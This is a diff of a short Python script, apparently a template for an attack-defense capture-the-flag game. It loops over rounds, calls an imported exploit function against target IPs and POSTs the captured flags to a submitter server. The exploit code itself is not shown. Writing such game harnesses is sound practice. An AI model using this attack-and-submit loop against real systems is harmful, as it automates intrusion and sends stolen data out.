@@ -1,22 +1,22 @@
 import requests
 import time
-from script_ticket import *
+from script_template import *
 
 
 def send_attack(ip, team_id):
     print(f"Attacco in corso a {ip}\n") 
-    results = get_info(team_id) #ritorna una lista di dizionari, per eventuali altri script modificare attributi
     info1 = "" #primo argomento flagID
     info2 = "" #secondo argomento flagID
+    results = get_info(team_id, info1, info2) #ritorna una lista di dizionari, per eventuali altri script modificare attributi
     print(results) # per debug, opzionale
     for i in range (0,4): #itera sui 4 round nelle info prese da fileID
         #round = results[i]["round"] if results else None #se si vuole fare qualcosa con i round
-        ctf_id = results[i][info1] if results else None
-        ticket_id = results[i][info2] if results else None
+        arg1 = results[i][info1] if results else None
+        arg2 = results[i][info2] if results else None
         #print(round) 
         #print(ctf_id)
         #print(ticket_id)
-        flag = exploit(ip, ctf_id, ticket_id)
+        flag = exploit(ip, arg1, arg2)
         data = {'flag': flag}
         response = requests.post(submitter_ip, data=data)
         print("Status Code:", response.status_code)
